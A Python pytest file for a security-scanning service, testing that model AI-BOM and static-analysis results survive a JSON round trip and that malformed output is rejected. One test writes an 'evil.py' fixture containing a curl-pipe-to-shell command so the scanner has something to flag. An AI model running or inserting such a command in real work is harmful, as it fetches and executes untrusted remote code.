"""Evidence decoded from analyzer JSON equals what the scanners produced, and bad JSON fails."""

import copy
import json
import shutil

import pytest

from app.analysis.codec import model_analysis_from_aibom, static_from_dict
from app.core.config import Settings
from app.core.errors import AppError
from app.sandbox_worker.collect import static_limits, static_to_dict
from app.scanners.model.aibom import ModelContext, analyze_model, build_aibom_document
from app.scanners.static.analyzer import analyze_artifact
from tests.conftest import FIXTURES, SIMPLE_PROJECT

MODEL_FIXTURES = FIXTURES / "model"


def _model_dirs():
    return sorted(p for p in MODEL_FIXTURES.iterdir() if p.is_dir())


@pytest.mark.parametrize("src", _model_dirs(), ids=lambda p: p.name)
def test_aibom_round_trip_is_lossless(src, tmp_path):
    work = tmp_path / "src"
    shutil.copytree(src, work)
    ctx = ModelContext(name=src.name, artifact_type="model", source="upload", source_url=None)
    original = analyze_model(work, ctx, Settings(_env_file=None))
    decoded = model_analysis_from_aibom(json.loads(json.dumps(original.aibom)))
    assert build_aibom_document(ctx, decoded) == original.aibom
    assert decoded.serialization_counts == original.serialization_counts
    assert decoded.custom_code.remote_code_required == original.custom_code.remote_code_required
    assert [r.name for r in decoded.runtime_deps] == [r.name for r in original.runtime_deps]


def test_static_round_trip_is_lossless(tmp_path):
    work = tmp_path / "src"
    shutil.copytree(SIMPLE_PROJECT, work)
    (work / "evil.py").write_text("import os\nos.system('curl x | sh')\n")
    original = analyze_artifact(work, static_limits(Settings(_env_file=None)))
    assert original.findings
    decoded = static_from_dict(json.loads(json.dumps(static_to_dict(original))))
    assert static_to_dict(decoded) == static_to_dict(original)


def _valid_aibom(tmp_path):
    src = _model_dirs()[0]
    work = tmp_path / "src"
    shutil.copytree(src, work)
    ctx = ModelContext(name="m", artifact_type="model", source="upload", source_url=None)
    return analyze_model(work, ctx, Settings(_env_file=None)).aibom


@pytest.mark.parametrize(
    "mutate",
    [
        lambda d: d.pop("files"),
        lambda d: d.update(files="not-a-list"),
        lambda d: d["files"].append({"path": 5}),
        lambda d: d["custom_code"].update(auto_map=[1, 2]),
        lambda d: d["model_card"].update(completeness="high"),
        lambda d: d.update(adapters=[{"no_config_key": True}]),
        lambda d: d["base_models"].append({"id": None}),
    ],
)
def test_malformed_aibom_is_rejected(tmp_path, mutate):
    doc = copy.deepcopy(_valid_aibom(tmp_path))
    mutate(doc)
    with pytest.raises(AppError) as info:
        model_analysis_from_aibom(doc)
    assert info.value.code == "analyzer_output_invalid"


@pytest.mark.parametrize(
    "mutate",
    [
        lambda d: d.pop("features"),
        lambda d: d["findings"].append({"rule": {"id": "X"}}),
        lambda d: d.update(findings=[{**FINDING, "rule": {**FINDING["rule"], "severity": "LOL"}}]),
        lambda d: d.update(findings_truncated="no"),
    ],
)
def test_malformed_static_is_rejected(mutate):
    doc = {
        "features": {},
        "findings": [],
        "findings_truncated": False,
        "not_analyzed": [],
        "not_analyzed_count": 0,
        "limitations": [],
    }
    mutate(doc)
    with pytest.raises(AppError) as info:
        static_from_dict(doc)
    assert info.value.code == "analyzer_output_invalid"


FINDING = {
    "rule": {"id": "PX-X", "kind": "k", "severity": "LOW", "title": "t"},
    "file": "a.py",
    "occurrences": 1,
    "lines": [1],
    "cells": [],
    "symbols": ["s"],
}
